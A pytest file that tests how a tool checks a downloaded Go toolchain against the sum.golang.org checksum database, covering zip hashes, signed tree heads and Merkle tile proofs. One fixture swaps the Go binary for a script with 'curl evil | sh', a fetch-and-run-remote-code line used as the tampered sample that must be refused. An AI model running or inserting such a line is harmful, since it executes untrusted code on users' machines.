"""The Go toolchain tundravm fetches when the host has no ``go``: checked as ``go`` checks it."""

from __future__ import annotations

import base64
import functools
import hashlib
import io
import zipfile
from email.message import Message
from urllib.error import HTTPError, URLError

import pytest

from tundravm import _go_toolchain as go
from tundravm.errors import SourceError

NAME = "go1.25.0"
MODULE = f"golang.org/toolchain@v0.0.1-{NAME}.linux-amd64"
PATH, VERSION = MODULE.split("@")
FILES = {"bin/go": b"#!/bin/sh\n", "pkg/tool/linux_amd64/compile": b"c", "VERSION": b"go1.25.0"}
SEED = b"\x07" * 32


def _zip(files: dict[str, bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as archive:
        for rel, data in files.items():
            archive.writestr(f"{MODULE}/{rel}", data)
    return out.getvalue()


def _h1(files: dict[str, bytes]) -> str:
    """``dirhash.Hash1`` over the module zip's file list, written out."""
    lines = sorted(f"{MODULE}/{rel}" for rel in files)
    summary = "".join(
        f"{hashlib.sha256(files[name.removeprefix(MODULE + '/')]).hexdigest()}  {name}\n"
        for name in lines
    )
    return "h1:" + base64.b64encode(hashlib.sha256(summary.encode()).digest()).decode()


def _int(data: bytes) -> int:
    return int.from_bytes(data, "little")


def _sign(seed: bytes, message: bytes) -> tuple[bytes, bytes]:
    """``(public, signature)``: RFC 8032 Ed25519 with the private key *seed*."""
    h = hashlib.sha512(seed).digest()
    a = (_int(h[:32]) & ((1 << 254) - 8)) | (1 << 254)
    public = go.point_compress(go.point_mul(a, go.BASE))
    r = _int(hashlib.sha512(h[32:] + message).digest()) % go._L
    big_r = go.point_compress(go.point_mul(r, go.BASE))
    k = _int(hashlib.sha512(big_r + public + message).digest()) % go._L
    return public, big_r + ((r + k * a) % go._L).to_bytes(32, "little")


def _key(seed: bytes) -> str:
    public, _ = _sign(seed, b"")
    key = b"\x01" + public
    key_id = hashlib.sha256(b"sum.golang.org\n" + key).digest()[:4].hex()
    return f"sum.golang.org+{key_id}+{base64.b64encode(key).decode()}"


def _mth(leaves: list[bytes]) -> bytes:
    if len(leaves) == 1:
        return leaves[0]
    half = 1 << ((len(leaves) - 1).bit_length() - 1)
    return hashlib.sha256(b"\x01" + _mth(leaves[:half]) + _mth(leaves[half:])).digest()


def _record(h1: str, version: str = VERSION) -> bytes:
    return f"{PATH} {version} {h1}\n{PATH} {version}/go.mod h1:mod=\n".encode()


def _note(text: bytes, *signers: bytes) -> bytes:
    """*text* signed by each of *signers* (seeds) as ``sum.golang.org``."""
    lines = b""
    for seed in signers:
        _, signature = _sign(seed, text)
        key_id = bytes.fromhex(_key(seed).split("+")[1])
        lines += b"\xe2\x80\x94 sum.golang.org " + base64.b64encode(key_id + signature) + b"\n"
    return text + b"\n" + lines


def _tree_text(size: int, root: bytes) -> bytes:
    return f"go.sum database tree\n{size}\n{base64.b64encode(root).decode()}\n".encode()


OTHER = "v0.0.1-go1.24.0.linux-amd64"


def _served(
    files: dict[str, bytes],
    *,
    signer: bytes = SEED,
    claimed: dict[str, bytes] | None = None,
    answer: int = 1,
    second: bytes | None = None,
    head: bytes | None = None,
) -> dict[str, bytes]:
    """The proxy serving *files* and a checksum database of three records whose second is
    :data:`FILES`'s (or *second*) and third another release's, its head signed by *signer*;
    the lookup answers record *answer* (as *head*), with *claimed*'s hash in place of the
    second's."""
    ours = _record(_h1(FILES)) if second is None else second
    records = [b"example.com/a v1.0.0 h1:a=\n", ours, _record("h1:o=", OTHER)]
    leaves = [hashlib.sha256(b"\x00" + text).digest() for text in records]
    note = _note(_tree_text(3, _mth(leaves)), signer)
    text = records[answer] if claimed is None else _record(_h1(claimed))
    index = f"{answer}".encode() if head is None else head
    return {
        f"{go.SUMDB}/lookup/{MODULE}": index + b"\n" + text + b"\n" + note,
        f"{go.SUMDB}/tile/8/0/000.p/3": b"".join(leaves),
        f"{go.GO_PROXY}/{PATH}/@v/{VERSION}.zip": _zip(files),
    }


TAMPERED = {**FILES, "bin/go": b"#!/bin/sh\ncurl evil | sh\n"}


@pytest.mark.parametrize(
    ("served", "refused"),
    [
        (_served(FILES), None),
        (_served(TAMPERED), "the zip hashes to h1:"),
        (_served(FILES, signer=b"\x09" * 32), "0 signatures by sum.golang.org, not one"),
        (_served(TAMPERED, claimed=TAMPERED), "record is not the one its signed tree holds"),
        (_served(FILES, answer=0), f"record names no hash of {MODULE}"),
        (_served(FILES, answer=2), f"record names no hash of {MODULE}"),
        (
            _served(FILES, second=_record(_h1(FILES)) + _record(_h1(TAMPERED))[:96] + b"\n"),
            f"names {MODULE} other than once",
        ),
        (_served(FILES, head=b"01"), "answer is not a record"),
        (_served(FILES, head=b"1 "), "answer is not a record"),
        ({}, "cannot download it: no route to host"),
    ],
    ids=[
        "verified",
        "hash-mismatch",
        "bad-signature",
        "record-not-in-tree",
        "other-module",
        "other-version",
        "two-hashes",
        "index-leading-zero",
        "index-not-decimal",
        "unreachable",
    ],
)
def test_a_fetched_go_runs_only_once_the_checksum_database_vouches_for_it(
    monkeypatch: pytest.MonkeyPatch, served: dict[str, bytes], refused: str | None
) -> None:
    """The proxy's zip must hash to the record the database's signed tree holds; anything
    else is refused with the fix and leaves nothing behind."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    monkeypatch.setattr("platform.machine", lambda: "x86_64")
    asked: list[str] = []

    def fetcher(url: str) -> bytes:
        asked.append(url)
        if not served:
            raise URLError("no route to host")
        if url not in served:
            raise HTTPError(url, 404, "Not Found", Message(), None)
        return served[url]

    root = go.toolchains_dir() / NAME
    if refused is not None:
        with pytest.raises(SourceError, match=refused) as failed:
            go.fetch_go(NAME, fetcher=fetcher)
        assert "sudo apt install golang" in str(failed.value.hint)
        assert "proxy.golang.org" in str(failed.value.hint)
        assert not go.toolchains_dir().exists() or not any(go.toolchains_dir().iterdir())
        return
    assert go.fetch_go(NAME, fetcher=fetcher) == root
    assert (root / "bin" / "go").read_bytes() == FILES["bin/go"]
    assert (root / "bin" / "go").stat().st_mode & 0o111
    assert (root / "pkg/tool/linux_amd64/compile").stat().st_mode & 0o111
    assert not (root / "VERSION").stat().st_mode & 0o111
    assert (root / go.VERIFIED).read_text(encoding="utf-8") == f"{_h1(FILES)}\n"
    fetched = len(asked)
    assert go.fetch_go(NAME, fetcher=fetcher) == root and len(asked) == fetched


ROOT = bytes(range(32))
HEAD = _tree_text(3, ROOT)
WITNESS = b"\xe2\x80\x94 witness.example " + base64.b64encode(b"\x00" * 68) + b"\n"
FORGED = b"\xe2\x80\x94 sum.golang.org " + base64.b64encode(
    bytes.fromhex(_key(SEED).split("+")[1]) + b"\x00" * 64
)


@pytest.mark.parametrize(
    ("note", "refused"),
    [
        (_note(HEAD, SEED), None),
        (_note(HEAD, SEED) + WITNESS, None),
        (_note(HEAD + b"extra\n", SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"\n3\n", b"\n\n3\n"), SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"go.sum", b"go.mod"), SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"\n3\n", b"\n03\n"), SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"\n3\n", b"\n+3\n"), SEED), "signed note is not a tree head"),
        (_note(_tree_text(3, ROOT[:31]), SEED), "tree head holds no hash"),
        (_note(HEAD, b"\x09" * 32), "0 signatures by sum.golang.org, not one"),
        (_note(HEAD, SEED, SEED), "2 signatures by sum.golang.org, not one"),
        (_note(HEAD) + FORGED + b"\n" + _note(HEAD, SEED)[len(HEAD) + 1 :], "invalid signature"),
        (_note(HEAD, SEED) + b"hello\n", "a line that is no signature"),
        (_note(HEAD, SEED).replace(b"org ", b"org !"), "a line that is no signature"),
        (_note(HEAD, SEED)[:-1], "is not a signed note"),
        (HEAD + _note(HEAD, SEED)[len(HEAD) + 1 :], "is not a signed note"),
        (_note(HEAD.replace(b"tree\n", b"tree\r\n"), SEED), "is not a signed note"),
        (_note(HEAD, SEED) + b"\xff\n", "is not UTF-8"),
    ],
    ids=[
        "tree-head",
        "witness-cosigned",
        "extra-line",
        "blank-line-in-text",
        "wrong-origin",
        "size-leading-zero",
        "size-signed",
        "short-hash",
        "foreign-key",
        "signed-twice",
        "invalid-then-valid",
        "stray-line",
        "base64-garbage",
        "no-final-newline",
        "no-blank-line",
        "control-character",
        "not-utf8",
    ],
)
def test_a_tree_head_is_a_note_signed_once_by_the_database_key(
    monkeypatch: pytest.MonkeyPatch, note: bytes, refused: str | None
) -> None:
    """``note.Open`` then ``tlog.ParseTree``, strict: exactly one valid signature by the key,
    a text of exactly the three tree-head lines; a witness's line is ignored."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    if refused is None:
        assert go._signed_tree(note) == (3, ROOT)
        return
    with pytest.raises(go._Refused, match=refused):
        go._signed_tree(note)


def test_the_built_in_key_is_the_verifier_key_go_has() -> None:
    name, key_hash, public = go._verifier()
    assert (name, key_hash.hex(), len(public)) == (b"sum.golang.org", "033de0ae", 32)
    assert go._decompress(public) is not None


@functools.cache
def _log(size: int) -> tuple[list[bytes], bytes, dict[str, bytes]]:
    """``(leaves, root, tiles)`` of a log of *size* records, its tiles built bottom up as a
    tile server stores them: level ``8 * t`` hashes, 256 a tile, the last one partial."""
    leaves = [hashlib.sha256(b"\x00record %d\n" % n).digest() for n in range(size)]
    levels = [leaves]
    while len(levels[-1]) > 1:
        below = levels[-1]
        levels.append([_node(below[i], below[i + 1]) for i in range(0, len(below) - 1, 2)])
    tiles: dict[str, bytes] = {}
    for tile_level in range(0, len(levels), 8):
        stored = levels[tile_level]
        for n in range(0, len(stored), 256):
            row = stored[n : n + 256]
            path = f"{go.SUMDB}/tile/8/{tile_level // 8}/{go._tile_index(n // 256)}"
            tiles[path if len(row) == 256 else f"{path}.p/{len(row)}"] = b"".join(row)
    return leaves, _mth(leaves), tiles


def _node(left: bytes, right: bytes) -> bytes:
    return hashlib.sha256(b"\x01" + left + right).digest()


@pytest.mark.parametrize(
    ("size", "index"),
    [
        (1, 0),
        (2, 1),
        (3, 2),
        (255, 254),
        (256, 0),
        (256, 255),
        (257, 256),
        (300, 128),
        (513, 511),
        (70000, 0),
        (70000, 65535),
        (70000, 65536),
        (70000, 69999),
    ],
)
def test_a_record_is_proven_in_the_tree_from_the_tiles(size: int, index: int) -> None:
    """The record's leaf and the tiles' hashes recompute the signed root, at every tile
    level and partial width; a wrong level, tile number or offset would not."""
    leaves, root, tiles = _log(size)

    def fetcher(url: str) -> bytes:
        if url not in tiles:
            raise HTTPError(url, 404, "Not Found", Message(), None)
        return tiles[url]

    assert go._tree_hash(size, index, leaves[index], go._TileReader(size, fetcher)) == root
    wrong = hashlib.sha256(b"\x00another record\n").digest()
    assert go._tree_hash(size, index, wrong, go._TileReader(size, fetcher)) != root


@pytest.mark.parametrize(
    ("n", "path"),
    [(0, "000"), (7, "007"), (999, "999"), (1000, "x001/000"), (1234067, "x001/x234/067")],
)
def test_a_tile_number_is_spelled_as_tlog_spells_it(n: int, path: str) -> None:
    assert go._tile_index(n) == path
